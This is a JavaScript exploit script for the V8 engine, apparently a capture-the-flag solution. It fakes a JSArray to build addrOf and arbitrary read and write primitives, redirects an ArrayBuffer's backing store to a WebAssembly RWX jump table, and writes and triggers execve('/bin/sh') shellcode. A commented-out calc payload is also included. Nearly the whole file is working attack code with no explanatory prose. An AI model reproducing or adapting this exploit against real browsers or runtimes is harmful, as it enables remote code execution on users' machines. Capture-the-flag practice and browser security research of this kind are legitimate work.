class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv  = new DataView(this.buf);
        this.u8  = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);
        this.index 	 = 0;
    }

    pair_i32_to_f64(p1, p2) {
        this.u32[0] = p1;
        this.u32[1] = p2;
        return this.f64[0];
    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }
    
    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }
    
    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[1]
    }
    
    printhex(val) {
        console.log('0x' + val.toString(16));
    }

    breakpoint() {
        this.buf.slice();
    }
}

function f(){
    v0 = Math.sqrt(16);
}

function mark_sweep_gc() {
	new ArrayBuffer(0x7fe00000);
}

function scavenge_gc() {
    let arr = new Array(0x10000);
    for(let i = 0; i < arr.length; i++) {
        arr[i] = new String("");
    }
}

var addrOf_helper = new Array(0x30000);
var helpers = new Helpers();
var fake_object_helper;
let v0 = 48763;

mark_sweep_gc();
mark_sweep_gc();



for (var i = 0; i < 0x10000; i++) {
    f();
}

scavenge_gc();
mark_sweep_gc();

fake_object_helper = [0.0, 0.0, 0.0, 0.0, 6.699586332753336e-309, 2.7815821086593595e-308, 8.34402697134475e-309, 0];

//console.log(helpers.pair_i32_to_f64(0x0004d149, 0x0004d149));  -> 6.699586332753336e-309
//console.log(helpers.pair_i32_to_f64(0x000007bd, 0x00140071)); -> 2.7815821086593595e-308
//console.log(helpers.pair_i32_to_f64(0x60000, 0x60000)); -> 8.34402697134475e-309

// 100011000007bd
var fake_array = v0;
console.log('[+] fake_array.length : 0x' + fake_array.length.toString(16));


//console.log(helpers.pair_i32_to_f64(0x000007bd, 0x001c0011)); -> 3.8939153263170276e-308 
/*
terry1234@terry1234-virtual-machine:~/v8/out/hitcon_ctf$ ./d8 --allow-natives-syntax poc.js  
DebugPrint: 0x385900063051: [JSArray] in OldSpace
 - map: 0x38590004d105 <Map[16](HOLEY_SMI_ELEMENTS)> [FastProperties]
 - prototype: 0x38590004caad <JSArray[0]>
 - elements: 0x3859001c0011 <FixedArray[196608]> [HOLEY_SMI_ELEMENTS]
 - length: 196608
 - properties: 0x3859000007bd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x385900000df1: [String] in ReadOnlySpace: #length: 0x385900026839 <AccessorInfo name= 0x385900000df1 <String[6]: #length>, data= 0x385900000011 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x3859001c0011 <FixedArray[196608]> {
    0-196607: 0x3859000067b9 <the_hole_value>
 }
0x38590004d105: [Map] in OldSpace
 - map: 0x3859000448d5 <MetaMap (0x385900044925 <NativeContext[300]>)>
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: HOLEY_SMI_ELEMENTS
 - enum length: invalid
 - back pointer: 0x38590004ca85 <Map[16](PACKED_SMI_ELEMENTS)>
 - prototype_validity_cell: 0x385900000ac9 <Cell value= [cleared]>
 - instance descriptors #1: 0x38590004d0c9 <DescriptorArray[1]>
 - transitions #1: 0x38590004d12d <TransitionArray[5]>
   Transitions #1:
     0x385900000e8d <Symbol: (elements_transition_symbol)>: (transition to PACKED_DOUBLE_ELEMENTS) -> 0x38590004d149 <Map[16](PACKED_DOUBLE_ELEMENTS)>
 - prototype: 0x38590004caad <JSArray[0]>
 - constructor: 0x38590004c9d5 <JSFunction Array (sfi = 0x385900195c09)>
 - dependent code: 0x3859000007cd <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
*/

function addrOf(obj){
    fake_object_helper[5] = 3.8939153263170276e-308;
    addrOf_helper[0] = obj;
    return helpers.f64toi64(fake_array[0]) & 0xffffffffn;
}

function arbRead32(where) {
    fake_object_helper[5] = helpers.pair_i32_to_f64(0x000007bd, Number(where) - 8);
    return helpers.f64toi64(fake_array[0]) & 0xffffffffn;
}

function arbRead64(where) {
    fake_object_helper[5] = helpers.pair_i32_to_f64(0x000007bd, Number(where) - 8);
    return helpers.f64toi64(fake_array[0]);
}

function arbWrite(where, what) {
    fake_object_helper[5] = helpers.pair_i32_to_f64(0x000007bd, Number(where) - 8);
    fake_array[0] = helpers.i64tof64(what);
}
/* calc
var sc_arr = [
    0x10101010101b848n,    0x62792eb848500101n,    0x431480101626d60n,    0x2f7273752fb84824n,
    0x48e78948506e6962n,    0x1010101010101b8n,    0x6d606279b8485001n,    0x2404314801010162n,
    0x1485e086a56f631n,    0x313b68e6894856e6n,    0x101012434810101n,    0x4c50534944b84801n,
    0x6a52d231503d5941n,    0x894852e201485a08n,    0x50f583b6ae2n,
];*/

var sc_arr = [
  0x732f6e69622fb848n,  // mov rax, 0x0068732f6e69622f
  0x3148e78948500068n,  // push rax ; mov rdi,rsp ; xor rsi,rsi
  0x3bc0c748d23148f6n,  // xor rdx,rdx ; mov rax,59
  0x909090050f000000n,  // syscall ; NOP,NOP,NOP (padding)
];
var dataview_buffer = new ArrayBuffer(sc_arr.length * 8);
var dataview = new DataView(dataview_buffer);
var buf_backing_store_addr = addrOf(dataview_buffer) + 0x24n

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
/*
var addr_f = addrOf(f);
%DebugPrint(f);
var shared_function_info_addr = arbRead32(addr_f + 0x10n);
var trusted_function_data_addr = arbRead32(shared_info_addr + 0x4n);
internal_addr = arbRead32(trusted_function_data_addr + 0x10n);
*/
trusted_data_addr = arbRead32(addrOf(wasmInstance) + 0xcn);
jump_table_start_addr = arbRead64(trusted_data_addr + 0x28n);

console.log('[+] Trusted Data Addr : 0x' + trusted_data_addr.toString(16));
console.log('[+] Jump Table Start Addr : 0x' + jump_table_start_addr.toString(16));
console.log('[+] Backing Store Addr : 0x' + arbRead64(buf_backing_store_addr).toString(16));
/*
helpers.printhex(jump_table_start_addr);
helpers.printhex(arbRead64(buf_backing_store_addr));
*/
     
console.log('[+] Overwriting Backing Store Addr ...');

arbWrite(buf_backing_store_addr, jump_table_start_addr);

console.log('[+] Writing Shellcode to wasm rwx page ...');
for(let i = 0; i < sc_arr.length; i++) {
    dataview.setFloat64(i * 8, helpers.i64tof64(sc_arr[i]), true);
}

console.log('[+] Trigger Shellcode !');

f();